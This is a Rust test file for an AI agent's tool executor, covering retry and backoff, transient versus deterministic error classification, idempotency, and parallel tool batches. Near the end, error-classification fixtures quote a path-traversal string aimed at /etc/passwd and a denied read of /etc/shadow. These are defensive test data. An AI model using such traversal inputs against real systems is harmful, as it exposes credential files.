        let id2 = compute_execution_id("bash", &serde_json::json!({"cmd": "ls"}), "");
        assert_eq!(id1, id2);
    }

    #[tokio::test]
    async fn idempotency_parallel_batch_dedup() {
        use crate::repl::idempotency::IdempotencyRegistry;

        let registry = halcon_tools::default_registry(&Default::default());
        let (event_tx, _rx) = halcon_core::event_bus(16);
        let mut idx = 0u32;
        let idem = IdempotencyRegistry::new();

        // Two identical file_read calls in a parallel batch.
        let batch = vec![
            CompletedToolUse {
                id: "t1".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"path": "/tmp"}),
            },
            CompletedToolUse {
                id: "t2".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"path": "/tmp"}),
            },
        ];

        let config = ToolExecutionConfig {
            dry_run_mode: DryRunMode::Off,
            idempotency: Some(&idem),
            ..Default::default()
        };

        let results = execute_parallel_batch(
            &batch,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            &event_tx,
            None,
            uuid::Uuid::new_v4(),
            &mut idx,
            10,
            &config,
            &*TEST_SINK,
            None, // plugin_registry
            None, // permission_pipeline
            None, // permissions
        )
        .await;

        assert_eq!(results.len(), 2);
        // Only 1 entry in idempotency (deduped by same args).
        assert_eq!(idem.len(), 1);
    }

    // --- Phase 18: Tool retry tests ---

    #[test]
    fn transient_error_detection() {
        assert!(is_transient_error("connection timed out after 30s"));
        assert!(is_transient_error("rate_limit_exceeded"));
        assert!(is_transient_error("429 Too Many Requests"));
        assert!(is_transient_error("Connection reset by peer"));
        assert!(!is_transient_error("file not found: /tmp/missing.rs"));
        assert!(!is_transient_error("permission denied"));
        // HTTP 5xx gateway/overload errors are transient
        assert!(is_transient_error(
            "HTTP 502: request to https://api.example.com failed"
        ));
        assert!(is_transient_error(
            "HTTP 503: request to https://api.example.com failed"
        ));
        assert!(is_transient_error(
            "HTTP 504: request to https://api.example.com failed"
        ));
        assert!(is_transient_error("503 Service Unavailable"));
        assert!(is_transient_error("502 Bad Gateway"));
        // HTTP client errors (4xx except 429) are NOT transient
        assert!(!is_transient_error("HTTP 400: bad request"));
        assert!(!is_transient_error("HTTP 401: unauthorized"));
        assert!(!is_transient_error("HTTP 403: forbidden"));
        assert!(!is_transient_error("HTTP 404: not found"));
    }

    #[test]
    fn transient_error_cargo_lock_patterns() {
        // IMP-3: cargo lock contention is transient and env-repairable
        assert!(is_transient_error(
            "error: failed to open: /project/target/debug/.cargo-lock"
        ));
        assert!(is_transient_error("could not acquire package cache lock"));
        assert!(is_transient_error(
            "waiting for file lock on build directory"
        ));
        // EAGAIN / resource temporarily unavailable
        assert!(is_transient_error(
            "Resource temporarily unavailable (EAGAIN)"
        ));
        assert!(is_transient_error("resource temporarily unavailable"));
        // Non-transient errors must not be misclassified
        assert!(!is_transient_error(
            "permission denied: /project/target/debug/halcon"
        ));
        assert!(!is_transient_error("unknown tool: cargo_lock_remover"));
    }

    #[test]
    fn tool_retry_config_defaults() {
        let config = ToolRetryConfig::default();
        assert_eq!(config.max_retries, 2);
        assert_eq!(config.base_delay_ms, 500);
        assert_eq!(config.max_delay_ms, 5000);
    }

    #[test]
    fn tool_retry_config_serde_roundtrip() {
        let config = ToolRetryConfig {
            max_retries: 5,
            base_delay_ms: 1000,
            max_delay_ms: 10000,
        };
        let json = serde_json::to_string(&config).unwrap();
        let rt: ToolRetryConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(rt.max_retries, 5);
        assert_eq!(rt.base_delay_ms, 1000);
        assert_eq!(rt.max_delay_ms, 10000);
    }

    #[test]
    fn permanent_error_not_retried() {
        // Permanent errors should not be classified as transient.
        assert!(!is_transient_error("Error: unknown tool 'foo'"));
        assert!(!is_transient_error("Error: invalid JSON input"));
    }

    // ── Multi-provider transient error coverage ───────────────────────────────
    //
    // Verifies that is_transient_error() correctly classifies provider-specific
    // error strings as defined by each provider's HTTP layer:
    //   - Anthropic: HTTP 429/500/529, overloaded_error, retryable error:
    //   - Cenzontle: connection errors, timeout patterns, provider-internal errors
    //   - OpenAI-compatible: HTTP 429, HTTP 500, rate limit / overloaded patterns

    #[test]
    fn anthropic_provider_transient_errors() {
        // HTTP 429 — rate limited
        assert!(is_transient_error(
            "HTTP 429: rate limit exceeded — retry after 30s"
        ));
        // HTTP 500 — internal server error
        assert!(is_transient_error(
            "HTTP 500: internal server error at https://api.anthropic.com/v1/messages"
        ));
        assert!(is_transient_error("500 Internal Server Error"));
        // HTTP 529 — Anthropic overloaded (non-standard status)
        assert!(is_transient_error(
            "HTTP 529: service temporarily overloaded"
        ));
        // overloaded_error type (returned in error.type JSON field)
        assert!(is_transient_error(
            r#"{"type":"error","error":{"type":"overloaded_error","message":"Overloaded"}}"#
        ));
        assert!(is_transient_error("Anthropic API error: overloaded"));
        // retryable error: prefix emitted by the Anthropic SDK wrapper
        assert!(is_transient_error(
            "retryable error: upstream connection dropped mid-stream"
        ));
        // Non-transient Anthropic errors must NOT be misclassified
        assert!(!is_transient_error(
            "HTTP 401: invalid API key — check ANTHROPIC_API_KEY"
        ));
        assert!(!is_transient_error(
            "HTTP 400: invalid request — max_tokens exceeds model limit"
        ));
    }

    #[test]
    fn cenzontle_provider_transient_errors() {
        // Connection-level transient errors
        assert!(is_transient_error(
            "connection refused: cenzontle-api.internal:8443"
        ));
        assert!(is_transient_error(
            "network error: failed to connect to Cenzontle endpoint"
        ));
        assert!(is_transient_error(
            "transport error: TLS handshake timed out"
        ));
        // Timeout patterns from the Cenzontle internal proxy
        assert!(is_transient_error(
            "request timed out after 30000ms — Cenzontle inference gateway"
        ));
        // Broken pipe (e.g., server closed keep-alive connection)
        assert!(is_transient_error("broken pipe: Cenzontle event stream"));
        // Channel-closed pattern from EventBus bridge (Cenzontle provider)
        assert!(is_transient_error(
            "channel closed: Cenzontle EventBus receiver dropped"
        ));
        // Non-transient Cenzontle errors
        assert!(!is_transient_error(
            "Cenzontle API error 403: access denied to model scope"
        ));
        assert!(!is_transient_error(
            "Cenzontle API error: invalid model identifier 'unknown-v99'"
        ));
    }

    #[test]
    fn openai_compatible_provider_transient_errors() {
        // OpenAI HTTP 429
        assert!(is_transient_error(
            "HTTP 429: You exceeded your current quota — rate limit"
        ));
        // OpenAI HTTP 500
        assert!(is_transient_error(
            "HTTP 500: The server had an error processing your request"
        ));
        // OpenAI HTTP 502/503 (via load balancer)
        assert!(is_transient_error("502 Bad Gateway"));
        assert!(is_transient_error(
            "503 Service Unavailable — try again later"
        ));
        // OpenAI overloaded / capacity
        assert!(is_transient_error(
            "openai: overloaded — model capacity exceeded, retry recommended"
        ));
        // Timeout on streaming response
        assert!(is_transient_error(
            "timeout: OpenAI stream read timed out after 60s"
        ));
        // Non-transient OpenAI errors
        assert!(!is_transient_error(
            "HTTP 400: invalid_request_error — model 'gpt-99' does not exist"
        ));
        assert!(!is_transient_error("HTTP 401: Incorrect API key provided"));
    }

    // ── S1: Unified is_error retry contract ─────────────────────────────────
    //
    // Verify that Ok(ToolOutput { is_error: true }) with transient content is
    // retried, while Ok(ToolOutput { is_error: true }) with deterministic content
    // and Ok(ToolOutput { is_error: false }) are returned immediately.

    mod s1_is_error_retry_contract {
        use std::sync::{
            atomic::{AtomicUsize, Ordering},
            Arc,
        };

        use async_trait::async_trait;
        use halcon_core::error::Result;
        use halcon_core::traits::Tool;
        use halcon_core::types::{PermissionLevel, ToolInput, ToolOutput};

        use super::*;

        /// Mock tool that returns `Ok(ToolOutput { is_error, content })` on every call.
        /// Counts the number of times `execute()` is called so tests can assert retry count.
        struct CountingIsErrorTool {
            call_count: Arc<AtomicUsize>,
            is_error: bool,
            content: &'static str,
        }

        #[async_trait]
        impl Tool for CountingIsErrorTool {
            fn name(&self) -> &str {
                "counting_is_error_tool"
            }
            fn description(&self) -> &str {
                "mock"
            }
            fn permission_level(&self) -> PermissionLevel {
                PermissionLevel::ReadOnly
            }
            fn input_schema(&self) -> serde_json::Value {
                serde_json::json!({})
            }
            async fn execute_inner(&self, input: ToolInput) -> Result<ToolOutput> {
                self.call_count.fetch_add(1, Ordering::SeqCst);
                Ok(ToolOutput {
                    tool_use_id: input.tool_use_id,
                    content: self.content.to_string(),
                    is_error: self.is_error,
                    metadata: None,
                })
            }
        }

        fn instant_retry() -> ToolRetryConfig {
            ToolRetryConfig {
                max_retries: 2,
                base_delay_ms: 0,
                max_delay_ms: 0,
            }
        }

        #[tokio::test]
        async fn transient_is_error_true_is_retried() {
            // A transient error returned as Ok(is_error=true) must be retried up to
            // max_retries times, exhausting all attempts before returning.
            let call_count = Arc::new(AtomicUsize::new(0));
            let tool: Arc<dyn Tool> = Arc::new(CountingIsErrorTool {
                call_count: call_count.clone(),
                is_error: true,
                content: "Error: connection timed out after 30s",
            });

            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "counting_is_error_tool".to_string(),
                input: serde_json::json!({}),
            };

            let result = run_with_retry(
                &tool_call,
                &tool,
                "/tmp",
                Duration::from_secs(5),
                &instant_retry(),
                &*TEST_SINK,
            )
            .await;

            // All 3 attempts (1 initial + 2 retries) must have fired.
            assert_eq!(
                call_count.load(Ordering::SeqCst),
                3,
                "transient is_error=true should exhaust all retries"
            );
            // Final result must still carry is_error=true.
            match &result.content_block {
                ContentBlock::ToolResult { is_error, .. } => {
                    assert!(*is_error, "final result must still be is_error=true");
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn deterministic_is_error_true_not_retried() {
            // A deterministic error returned as Ok(is_error=true) must NOT be retried.
            let call_count = Arc::new(AtomicUsize::new(0));
            let tool: Arc<dyn Tool> = Arc::new(CountingIsErrorTool {
                call_count: call_count.clone(),
                is_error: true,
                content: "Error: no such file or directory: /missing.rs",
            });

            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "counting_is_error_tool".to_string(),
                input: serde_json::json!({}),
            };

            run_with_retry(
                &tool_call,
                &tool,
                "/tmp",
                Duration::from_secs(5),
                &instant_retry(),
                &*TEST_SINK,
            )
            .await;

            assert_eq!(
                call_count.load(Ordering::SeqCst),
                1,
                "deterministic is_error=true must not be retried"
            );
        }

        #[tokio::test]
        async fn successful_output_not_retried() {
            // Ok(is_error=false) must always be returned immediately — never retried.
            let call_count = Arc::new(AtomicUsize::new(0));
            let tool: Arc<dyn Tool> = Arc::new(CountingIsErrorTool {
                call_count: call_count.clone(),
                is_error: false,
                content: "success output",
            });

            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "counting_is_error_tool".to_string(),
                input: serde_json::json!({}),
            };

            let result = run_with_retry(
                &tool_call,
                &tool,
                "/tmp",
                Duration::from_secs(5),
                &instant_retry(),
                &*TEST_SINK,
            )
            .await;

            assert_eq!(
                call_count.load(Ordering::SeqCst),
                1,
                "successful output must not trigger retry"
            );
            match &result.content_block {
                ContentBlock::ToolResult { is_error, .. } => {
                    assert!(!is_error);
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn transient_is_error_respects_max_retries_zero() {
            // Even for transient is_error=true, max_retries=0 means exactly one attempt.
            let call_count = Arc::new(AtomicUsize::new(0));
            let tool: Arc<dyn Tool> = Arc::new(CountingIsErrorTool {
                call_count: call_count.clone(),
                is_error: true,
                content: "rate_limit_exceeded",
            });

            let tool_call = CompletedToolUse {
                id: "t1".to_string(),
                name: "counting_is_error_tool".to_string(),
                input: serde_json::json!({}),
            };

            run_with_retry(
                &tool_call,
                &tool,
                "/tmp",
                Duration::from_secs(5),
                &ToolRetryConfig {
                    max_retries: 0,
                    base_delay_ms: 0,
                    max_delay_ms: 0,
                },
                &*TEST_SINK,
            )
            .await;

            assert_eq!(
                call_count.load(Ordering::SeqCst),
                1,
                "max_retries=0 must prevent retry even for transient is_error"
            );
        }
    }

    #[tokio::test]
    async fn max_retries_zero_executes_once() {
        // With max_retries=0, tool should execute exactly once (no retries).
        // Use an unknown tool to get a deterministic error.
        let registry = ToolRegistry::new();
        let tool = make_completed("t1", "nonexistent_tool");

        let no_retry = ToolRetryConfig {
            max_retries: 0,
            base_delay_ms: 10,
            max_delay_ms: 100,
        };

        let result = execute_one_tool(
            &tool,
            &registry,
            "/tmp",
            Duration::from_secs(10),
            DryRunMode::Off,
            None,
            &no_retry,
            &*TEST_SINK,
            None,
            None,
            "",
            &[],
        )
        .await;

        // Unknown tool should return error (no retries attempted).
        match &result.content_block {
            ContentBlock::ToolResult {
                content, is_error, ..
            } => {
                assert!(*is_error);
                assert!(content.contains("unknown tool"));
            }
            _ => panic!("expected ToolResult"),
        }
    }

    #[test]
    fn backoff_increases_exponentially() {
        let config = ToolRetryConfig {
            max_retries: 5,
            base_delay_ms: 100,
            max_delay_ms: 5000,
        };
        // Base delays before jitter:
        // attempt 0: 100 * 2^0 = 100
        // attempt 1: 100 * 2^1 = 200
        // attempt 2: 100 * 2^2 = 400
        // attempt 3: 100 * 2^3 = 800
        let delays: Vec<u64> = (0..4)
            .map(|attempt| {
                std::cmp::min(
                    config.base_delay_ms * 2u64.pow(std::cmp::min(attempt, 5)),
                    config.max_delay_ms,
                )
            })
            .collect();
        assert_eq!(delays, vec![100, 200, 400, 800]);
    }

    #[test]
    fn jittered_delay_stays_within_bounds() {
        // ±20% jitter means 80% to 120% of base.
        for _ in 0..100 {
            let d = jittered_delay(1000);
            assert!(d >= 800 && d <= 1200, "jittered delay out of range: {d}");
        }
    }

    // ============================================================
    //  Phase 3: Tool Integration Audit Tests
    //  Tests the executor pipeline: tool_call → execute → result chain
    // ============================================================

    mod integration_audit {
        use super::*;

        fn make_tool_call(id: &str, name: &str, args: serde_json::Value) -> CompletedToolUse {
            CompletedToolUse {
                id: id.to_string(),
                name: name.to_string(),
                input: args,
            }
        }

        // --- tool_use_id chain integrity ---

        #[tokio::test]
        async fn tool_use_id_preserved_through_execution() {
            let dir = tempfile::TempDir::new().unwrap();
            let f = dir.path().join("test.txt");
            std::fs::write(&f, "hello integration").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let unique_id = "toolu_integration_abc123";
            let tool_call = make_tool_call(
                unique_id,
                "file_read",
                serde_json::json!({"path": f.to_str().unwrap()}),
            );

            let result = execute_one_tool(
                &tool_call,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            assert_eq!(result.tool_use_id, unique_id);
            match &result.content_block {
                ContentBlock::ToolResult {
                    tool_use_id,
                    content,
                    is_error,
                } => {
                    assert_eq!(tool_use_id, unique_id);
                    assert!(!is_error);
                    assert!(content.contains("hello integration"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn tool_use_id_preserved_on_error() {
            let registry = halcon_tools::default_registry(&Default::default());
            let unique_id = "toolu_error_xyz789";
            let tool_call = make_tool_call(
                unique_id,
                "file_read",
                serde_json::json!({"path": "/nonexistent/path/file.txt"}),
            );

            let result = execute_one_tool(
                &tool_call,
                &registry,
                "/tmp",
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            assert_eq!(result.tool_use_id, unique_id);
            match &result.content_block {
                ContentBlock::ToolResult {
                    tool_use_id,
                    is_error,
                    ..
                } => {
                    assert_eq!(tool_use_id, unique_id);
                    assert!(is_error);
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn tool_use_id_preserved_for_unknown_tool() {
            let registry = halcon_tools::default_registry(&Default::default());
            let unique_id = "toolu_unknown_456";
            let tool_call = make_tool_call(unique_id, "nonexistent_tool", serde_json::json!({}));

            let result = execute_one_tool(
                &tool_call,
                &registry,
                "/tmp",
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            assert_eq!(result.tool_use_id, unique_id);
            match &result.content_block {
                ContentBlock::ToolResult {
                    tool_use_id,
                    is_error,
                    content,
                } => {
                    assert_eq!(tool_use_id, unique_id);
                    assert!(is_error);
                    assert!(content.contains("unknown tool"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        // --- Poisoned arg rejection (RC-4) ---

        #[tokio::test]
        async fn poisoned_args_rejected_immediately() {
            let registry = halcon_tools::default_registry(&Default::default());
            let tool_call = CompletedToolUse {
                id: "toolu_poisoned".to_string(),
                name: "file_read".to_string(),
                input: serde_json::json!({"_parse_error": "truncated JSON at position 42"}),
            };

            let result = execute_one_tool(
                &tool_call,
                &registry,
                "/tmp",
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            assert_eq!(result.tool_use_id, "toolu_poisoned");
            match &result.content_block {
                ContentBlock::ToolResult {
                    tool_use_id,
                    is_error,
                    content,
                } => {
                    assert_eq!(tool_use_id, "toolu_poisoned");
                    assert!(is_error);
                    assert!(content.contains("corrupted"));
                    assert!(content.contains("parse error"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn poisoned_args_never_reach_tool() {
            let registry = halcon_tools::default_registry(&Default::default());
            // If _parse_error is present, the tool should NOT execute.
            // We verify by using bash with a command that would succeed.
            let tool_call = CompletedToolUse {
                id: "toolu_no_exec".to_string(),
                name: "bash".to_string(),
                input: serde_json::json!({
                    "command": "echo this_should_never_run",
                    "_parse_error": "incomplete JSON"
                }),
            };

            let result = execute_one_tool(
                &tool_call,
                &registry,
                "/tmp",
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            match &result.content_block {
                ContentBlock::ToolResult {
                    content, is_error, ..
                } => {
                    assert!(is_error);
                    assert!(!content.contains("this_should_never_run"));
                    assert!(content.contains("corrupted"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        // --- Parallel batch: real tool execution ---

        #[tokio::test]
        async fn parallel_batch_real_file_read() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("a.txt"), "content_a").unwrap();
            std::fs::write(dir.path().join("b.txt"), "content_b").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, _rx) = halcon_core::event_bus(16);
            let mut idx = 0u32;

            let batch = vec![
                make_tool_call(
                    "t1",
                    "file_read",
                    serde_json::json!({"path": dir.path().join("a.txt").to_str().unwrap()}),
                ),
                make_tool_call(
                    "t2",
                    "file_read",
                    serde_json::json!({"path": dir.path().join("b.txt").to_str().unwrap()}),
                ),
            ];

            let results = execute_parallel_batch(
                &batch,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                &event_tx,
                None,
                uuid::Uuid::new_v4(),
                &mut idx,
                10,
                &ToolExecutionConfig::default(),
                &*TEST_SINK,
                None, // plugin_registry
                None, // permission_pipeline
                None, // permissions
            )
            .await;

            assert_eq!(results.len(), 2);
            // Results sorted by id.
            assert_eq!(results[0].tool_use_id, "t1");
            assert_eq!(results[1].tool_use_id, "t2");

            // Both should have actual file content.
            for result in &results {
                match &result.content_block {
                    ContentBlock::ToolResult {
                        is_error, content, ..
                    } => {
                        assert!(!is_error, "tool_use_id={}: {content}", result.tool_use_id);
                        assert!(content.contains("content_"));
                    }
                    _ => panic!("expected ToolResult"),
                }
            }
        }

        #[tokio::test]
        async fn parallel_batch_mixed_success_and_error() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("exists.txt"), "ok").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, _rx) = halcon_core::event_bus(16);
            let mut idx = 0u32;

            let batch = vec![
                make_tool_call(
                    "success",
                    "file_read",
                    serde_json::json!({"path": dir.path().join("exists.txt").to_str().unwrap()}),
                ),
                make_tool_call(
                    "fail",
                    "file_read",
                    serde_json::json!({"path": "/nonexistent/file.txt"}),
                ),
            ];

            let results = execute_parallel_batch(
                &batch,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                &event_tx,
                None,
                uuid::Uuid::new_v4(),
                &mut idx,
                10,
                &ToolExecutionConfig::default(),
                &*TEST_SINK,
                None, // plugin_registry
                None, // permission_pipeline
                None, // permissions
            )
            .await;

            assert_eq!(results.len(), 2);

            // Find each by tool_use_id.
            let success_result = results.iter().find(|r| r.tool_use_id == "success").unwrap();
            let fail_result = results.iter().find(|r| r.tool_use_id == "fail").unwrap();

            match &success_result.content_block {
                ContentBlock::ToolResult {
                    is_error, content, ..
                } => {
                    assert!(!is_error);
                    assert!(content.contains("ok"));
                }
                _ => panic!("expected ToolResult"),
            }

            match &fail_result.content_block {
                ContentBlock::ToolResult { is_error, .. } => {
                    assert!(is_error);
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn parallel_batch_with_unknown_tool_mixed() {
            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, _rx) = halcon_core::event_bus(16);
            let mut idx = 0u32;

            // file_read is ReadOnly → parallel. But nonexistent goes sequential.
            // In a real plan, unknown would go sequential. Here we test parallel batch directly.
            let batch = vec![make_tool_call(
                "valid",
                "glob",
                serde_json::json!({"pattern": "*.nonexistent_ext"}),
            )];

            let results = execute_parallel_batch(
                &batch,
                &registry,
                "/tmp",
                Duration::from_secs(10),
                &event_tx,
                None,
                uuid::Uuid::new_v4(),
                &mut idx,
                10,
                &ToolExecutionConfig::default(),
                &*TEST_SINK,
                None, // plugin_registry
                None, // permission_pipeline
                None, // permissions
            )
            .await;

            assert_eq!(results.len(), 1);
            assert_eq!(results[0].tool_use_id, "valid");
        }

        // --- Real tool execution through pipeline ---

        #[tokio::test]
        async fn real_bash_execution_through_executor() {
            let registry = halcon_tools::default_registry(&Default::default());
            let tool_call = make_tool_call(
                "bash-exec-1",
                "bash",
                serde_json::json!({"command": "echo integration_test_output"}),
            );

            let result = execute_one_tool(
                &tool_call,
                &registry,
                "/tmp",
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            assert_eq!(result.tool_name, "bash");
            match &result.content_block {
                ContentBlock::ToolResult {
                    content, is_error, ..
                } => {
                    assert!(!is_error);
                    assert!(content.contains("integration_test_output"));
                }
                _ => panic!("expected ToolResult"),
            }
            assert!(
                result.duration_ms > 0,
                "real execution should have non-zero duration"
            );
        }

        #[tokio::test]
        async fn real_grep_execution_through_executor() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(
                dir.path().join("search_target.txt"),
                "needle in haystack\nhaystack only\n",
            )
            .unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let tool_call = make_tool_call(
                "grep-exec-1",
                "grep",
                serde_json::json!({"pattern": "needle", "path": dir.path().to_str().unwrap()}),
            );

            let result = execute_one_tool(
                &tool_call,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            match &result.content_block {
                ContentBlock::ToolResult {
                    content, is_error, ..
                } => {
                    assert!(!is_error);
                    assert!(content.contains("needle"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        #[tokio::test]
        async fn real_file_write_then_read_roundtrip() {
            let dir = tempfile::TempDir::new().unwrap();
            let path = dir.path().join("roundtrip.txt");

            let registry = halcon_tools::default_registry(&Default::default());

            // Write.
            let write_call = make_tool_call(
                "write-1",
                "file_write",
                serde_json::json!({"path": path.to_str().unwrap(), "content": "roundtrip_data"}),
            );
            let write_result = execute_one_tool(
                &write_call,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            match &write_result.content_block {
                ContentBlock::ToolResult { is_error, .. } => assert!(!is_error),
                _ => panic!("expected ToolResult"),
            }

            // Read back.
            let read_call = make_tool_call(
                "read-1",
                "file_read",
                serde_json::json!({"path": path.to_str().unwrap()}),
            );
            let read_result = execute_one_tool(
                &read_call,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                DryRunMode::Off,
                None,
                &ToolRetryConfig::default(),
                &*TEST_SINK,
                None,
                None,
                "",
                &[],
            )
            .await;

            match &read_result.content_block {
                ContentBlock::ToolResult {
                    content, is_error, ..
                } => {
                    assert!(!is_error);
                    assert!(content.contains("roundtrip_data"));
                }
                _ => panic!("expected ToolResult"),
            }
        }

        // --- Protocol correctness: every result is ToolResult ---

        #[tokio::test]
        async fn all_results_are_tool_result_variant() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("f.txt"), "data").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, _rx) = halcon_core::event_bus(16);
            let mut idx = 0u32;

            let batch = vec![
                make_tool_call(
                    "r1",
                    "file_read",
                    serde_json::json!({"path": dir.path().join("f.txt").to_str().unwrap()}),
                ),
                make_tool_call(
                    "r2",
                    "glob",
                    serde_json::json!({"pattern": "*.txt", "path": dir.path().to_str().unwrap()}),
                ),
                make_tool_call(
                    "r3",
                    "directory_tree",
                    serde_json::json!({"path": dir.path().to_str().unwrap()}),
                ),
            ];

            let results = execute_parallel_batch(
                &batch,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                &event_tx,
                None,
                uuid::Uuid::new_v4(),
                &mut idx,
                10,
                &ToolExecutionConfig::default(),
                &*TEST_SINK,
                None, // plugin_registry
                None, // permission_pipeline
                None, // permissions
            )
            .await;

            assert_eq!(results.len(), 3);
            for result in &results {
                match &result.content_block {
                    ContentBlock::ToolResult { tool_use_id, .. } => {
                        // Every result must have a tool_use_id that matches one of the inputs.
                        assert!(
                            ["r1", "r2", "r3"].contains(&tool_use_id.as_str()),
                            "unexpected tool_use_id: {tool_use_id}"
                        );
                    }
                    other => panic!("expected ToolResult, got {other:?}"),
                }
            }
        }

        // --- No orphan results ---

        #[tokio::test]
        async fn no_orphan_results_every_id_matches_input() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("a.txt"), "a").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, _rx) = halcon_core::event_bus(16);
            let mut idx = 0u32;

            let input_ids = vec!["id_alpha", "id_beta", "id_gamma"];
            let batch: Vec<CompletedToolUse> = input_ids
                .iter()
                .map(|id| {
                    make_tool_call(
                        id,
                        "file_read",
                        serde_json::json!({"path": dir.path().join("a.txt").to_str().unwrap()}),
                    )
                })
                .collect();

            let results = execute_parallel_batch(
                &batch,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                &event_tx,
                None,
                uuid::Uuid::new_v4(),
                &mut idx,
                10,
                &ToolExecutionConfig::default(),
                &*TEST_SINK,
                None, // plugin_registry
                None, // permission_pipeline
                None, // permissions
            )
            .await;

            // Every result ID must match an input ID.
            let result_ids: Vec<&str> = results.iter().map(|r| r.tool_use_id.as_str()).collect();
            for id in &input_ids {
                assert!(result_ids.contains(id), "missing result for input id: {id}");
            }
            // No extra results.
            assert_eq!(results.len(), input_ids.len());
        }

        // --- Event emission ---

        #[tokio::test]
        async fn events_emitted_during_parallel_execution() {
            let dir = tempfile::TempDir::new().unwrap();
            std::fs::write(dir.path().join("f.txt"), "event_test").unwrap();

            let registry = halcon_tools::default_registry(&Default::default());
            let (event_tx, mut rx) = halcon_core::event_bus(64);
            let mut idx = 0u32;

            let batch = vec![make_tool_call(
                "ev1",
                "file_read",
                serde_json::json!({"path": dir.path().join("f.txt").to_str().unwrap()}),
            )];

            execute_parallel_batch(
                &batch,
                &registry,
                dir.path().to_str().unwrap(),
                Duration::from_secs(10),
                &event_tx,
                None,
                uuid::Uuid::new_v4(),
                &mut idx,
                10,
                &ToolExecutionConfig::default(),
                &*TEST_SINK,
                None, // plugin_registry
                None, // permission_pipeline
                None, // permissions
            )
            .await;

            // Should have received at least one event.
            let mut event_count = 0;
            while rx.try_recv().is_ok() {
                event_count += 1;
            }
            assert!(
                event_count >= 1,
                "expected at least 1 event, got {event_count}"
            );
        }

        // === Phase 27 (RC-3 fix): is_deterministic_error tests ===

        #[test]
        fn deterministic_file_not_found() {
            assert!(is_deterministic_error(
                "No such file or directory: /tmp/missing.rs"
            ));
            assert!(is_deterministic_error(
                "Error: File not found at /foo/bar.txt"
            ));
            assert!(is_deterministic_error("NOT FOUND"));
        }

        #[test]
        fn deterministic_permission_denied() {
            assert!(is_deterministic_error("Permission denied: /etc/shadow"));
            assert!(is_deterministic_error("PERMISSION DENIED for user"));
        }

        #[test]
        fn deterministic_path_type_errors() {
            assert!(is_deterministic_error(
                "Error: /tmp is a directory, expected a file"
            ));
            assert!(is_deterministic_error("not a directory: /tmp/file.txt/sub"));
        }

        #[test]
        fn deterministic_security_errors() {
            assert!(is_deterministic_error(
                "path traversal detected in ../../etc/passwd"
            ));
            assert!(is_deterministic_error(
                "Operation blocked by security policy"
            ));
            assert!(is_deterministic_error("unknown tool: foo_bar"));
            assert!(is_deterministic_error(
                "Action denied by task context access control"
            ));
        }

        #[test]
        fn deterministic_schema_errors() {
            assert!(is_deterministic_error(
                "schema validation failed: invalid type"
            ));
            assert!(is_deterministic_error("missing required field 'path'"));
        }

        #[test]
        fn non_deterministic_transient_errors() {
            // These should NOT be classified as deterministic
            assert!(!is_deterministic_error("connection timed out"));
            assert!(!is_deterministic_error("rate limit exceeded"));
            assert!(!is_deterministic_error("internal server error"));
            assert!(!is_deterministic_error("process killed by signal"));
